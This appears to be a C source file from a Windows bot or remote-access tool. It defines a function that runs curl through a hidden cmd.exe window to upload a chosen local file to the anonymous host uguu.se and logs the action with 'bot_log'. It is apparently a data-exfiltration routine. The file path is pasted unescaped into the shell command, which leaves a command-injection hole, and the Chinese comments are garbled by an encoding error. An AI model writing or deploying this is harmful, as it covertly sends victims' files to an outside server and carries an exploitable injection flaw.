#include "header.h"

/**
 * @brief �ϴ�ָ���ļ��� uguu.se��������������
 *
 * @param file_path Ҫ�ϴ����ļ�·��
 * @return char* �������ӣ���Ҫ������ free����ʧ�ܷ��� NULL
 */

char* upload_to_uguu(const char* file_path) {
    // ������ʱ�ļ������ڱ�����Ӧ
    char temp_file[MAX_PATH];
    if (GetTempPathA(MAX_PATH, temp_file) == 0) {
        bot_log("[!] GetTempPathA failed\n");
        return _strdup("[!] GetTempPathA failed\n");
    }

    strcat(temp_file, "upload_result.json");

    // ���������� cmd ����
    char cmd_line[4096];
    snprintf(cmd_line, sizeof(cmd_line),
        "/c curl -F \"files[]=@%s\" https://uguu.se/upload.php  > \"%s\"",
        file_path, temp_file);

    bot_log("[i] Executing command: curl -F \"files[]=@%s\" https://uguu.se/upload.php  > \"%s\"\n",
        file_path, temp_file);

    // ִ������
    if (run_executable("cmd.exe", cmd_line, SW_HIDE) != 0) {
        bot_log("[!] Failed to execute curl command\n");
        return _strdup("[!] Failed to execute curl command\n");
    }


    return _strdup(temp_file);
    
}